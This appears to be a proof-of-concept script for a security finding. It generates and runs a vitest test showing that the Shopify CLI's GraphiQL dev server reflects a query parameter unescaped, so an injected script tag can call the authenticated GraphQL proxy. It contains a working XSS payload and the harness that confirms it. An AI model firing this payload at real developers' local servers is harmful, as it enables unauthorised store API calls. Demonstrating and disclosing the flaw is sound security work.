#!/usr/bin/env node
import {spawnSync} from 'node:child_process'
import {existsSync, mkdirSync, readFileSync, writeFileSync} from 'node:fs'
import {dirname, join, relative, resolve} from 'node:path'
import {fileURLToPath} from 'node:url'

const findingDir = dirname(fileURLToPath(import.meta.url))
const repoRoot = resolve(findingDir, '../../..')
const evidenceDir = join(findingDir, 'evidence')
mkdirSync(evidenceDir, {recursive: true})

const testPath = join(evidenceDir, 'graphiql-xss.vitest.test.ts')
const serverPath = join(repoRoot, 'packages/app/src/cli/services/dev/graphiql/server.ts')
let serverImport = relative(dirname(testPath), serverPath).replace(/\\/g, '/')
if (!serverImport.startsWith('.')) serverImport = `./${serverImport}`

const payload = "</script><script id='poc-xss'>fetch('/graphiql/graphql.json?key=[REDACTED:secret]&api_version=unstable',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({query:'{ shop { name } }'})}).then(r=>r.text()).then(t=>document.body.setAttribute('data-poc-proxy-response',t.slice(0,32)))</script><script>"
const marker = "<script id='poc-xss'>"

writeFileSync(
  testPath,
  `import {afterAll, expect, test, vi} from 'vitest'\n` +
    `import {writeFileSync} from 'node:fs'\n` +
    `import {join} from 'node:path'\n` +
    `import {Writable} from 'node:stream'\n\n` +
    `vi.mock('@shopify/cli-kit/node/api/admin', () => ({\n` +
    `  adminUrl: (store: string, version: string | undefined) => \`https://\${store}/admin/api/\${version ?? 'unstable'}/graphql.json\`,\n` +
    `  supportedApiVersions: vi.fn(async () => ['2024-10', '2025-01']),\n` +
    `}))\n\n` +
    `vi.mock('@shopify/cli-kit/node/http', () => ({\n` +
    `  fetch: vi.fn(async () => ({status: 200, json: async () => ({access_token: '[REDACTED:secret]'})})),\n` +
    `}))\n\n` +
    `import {setupGraphiQLServer} from '${serverImport}'\n\n` +
    `const evidenceDir = ${JSON.stringify(evidenceDir)}\n` +
    `const payload = ${JSON.stringify(payload)}\n` +
    `const marker = ${JSON.stringify(marker)}\n` +
    `let server: ReturnType<typeof setupGraphiQLServer> | undefined\n\n` +
    `afterAll(async () => {\n` +
    `  if (server) await new Promise<void>((resolve, reject) => server!.close((err?: Error) => err ? reject(err) : resolve()))\n` +
    `})\n\n` +
    `test('valid-key GraphiQL URL emits attacker-controlled script tag from query parameter', async () => {\n` +
    `  server = setupGraphiQLServer({\n` +
    `    stdout: new Writable({write(_chunk, _enc, cb) { cb() }}),\n` +
    `    port: 0,\n` +
    `    appName: 'poc-app',\n` +
    `    appUrl: 'https://app.example',\n` +
    `    apiKey: '[REDACTED:secret]',\n` +
    `    apiSecret: 'poc-api-secret',\n` +
    `    key: 'poc-key',\n` +
    `    storeFqdn: 'shop.example',\n` +
    `  })\n` +
    `  await new Promise<void>((resolve) => server!.listening ? resolve() : server!.once('listening', resolve))\n` +
    `  const address = server.address()\n` +
    `  if (!address || typeof address === 'string') throw new Error('GraphiQL server did not expose a TCP address')\n\n` +
    `  const url = \`http://localhost:\${address.port}/graphiql?key=[REDACTED:secret]&query=\${encodeURIComponent(payload)}\`\n` +
    `  const response = await fetch(url)\n` +
    `  const html = await response.text()\n` +
    `  const idx = html.indexOf(marker)\n` +
    `  const snippet = idx >= 0 ? html.slice(Math.max(0, idx - 160), idx + 420) : html.slice(0, 800)\n` +
    `  const impact = [\n` +
    `    \`HTTP status: \${response.status}\`,\n` +
    `    \`Valid GraphiQL key accepted: \${response.status === 200}\`,\n` +
    `    \`Standalone injected script tag present: \${idx >= 0}\`,\n` +
    `    \`Injected script targets same-origin proxy: \${html.includes('/graphiql/graphql.json?key=[REDACTED:secret]&api_version=unstable')}\`,\n` +
    `    \`HTML-safe escaping absent: \${!html.includes('&lt;/script&gt;')}\`,\n` +
    `    '--- response context ---',\n` +
    `    snippet.replace(/\\n/g, '\\\\n'),\n` +
    `  ].join('\\n')\n` +
    `  writeFileSync(join(evidenceDir, 'impact.log'), impact + '\\n')\n` +
    `  writeFileSync(join(evidenceDir, 'rendered-graphiql.html'), html)\n` +
    `  console.log(impact)\n\n` +
    `  expect(response.status).toBe(200)\n` +
    `  expect(html).toContain(marker)\n` +
    `  expect(html).toContain('/graphiql/graphql.json?key=[REDACTED:secret]&api_version=unstable')\n` +
    `  expect(html).not.toContain('&lt;/script&gt;')\n` +
    `})\n`,
)

const vitestArgs = [
  'exec',
  'vitest',
  'run',
  '--config',
  'packages/app/vite.config.ts',
  relative(repoRoot, testPath).replace(/\\/g, '/'),
  '--reporter=basic',
]

const result = spawnSync('pnpm', vitestArgs, {
  cwd: repoRoot,
  encoding: 'utf8',
  env: {...process.env, VITEST_SKIP_TIMEOUT: '1', CI: '1'},
})

const exploitLog = [
  `$ pnpm ${vitestArgs.join(' ')}`,
  `exit_code=${result.status ?? 'signal:' + result.signal}`,
  '--- stdout ---',
  result.stdout ?? '',
  '--- stderr ---',
  result.stderr ?? '',
].join('\n')
writeFileSync(join(evidenceDir, 'exploit.log'), exploitLog)

const impactPath = join(evidenceDir, 'impact.log')
const impact = existsSync(impactPath) ? readFileSync(impactPath, 'utf8') : ''
const confirmed =
  result.status === 0 &&
  impact.includes('Standalone injected script tag present: true') &&
  impact.includes('Injected script targets same-origin proxy: true')

writeFileSync(
  join(evidenceDir, 'env-info.txt'),
  [
    `node=${process.version}`,
    `platform=${process.platform} ${process.arch}`,
    `repo=${repoRoot}`,
    `server=${serverPath}`,
    `poc_test=${testPath}`,
  ].join('\n') + '\n',
)

if (confirmed) {
  console.log(`Evidence written under ${relative(repoRoot, evidenceDir)}`)
  console.log(
    JSON.stringify({
      status: 'confirmed',
      evidence: "standalone <script id='poc-xss'> emitted in GraphiQL HTML",
      notes: 'The injected script includes a same-origin /graphiql/graphql.json POST using the valid GraphiQL key.',
    }),
  )
} else {
  const note = result.error ? result.error.message : `vitest exit ${result.status}`
  console.log(`PoC did not observe the XSS marker; see ${relative(repoRoot, join(evidenceDir, 'exploit.log'))}`)
  console.log(JSON.stringify({status: 'failed', evidence: 'XSS marker absent from rendered GraphiQL HTML', notes: note}))
  process.exitCode = 1
}
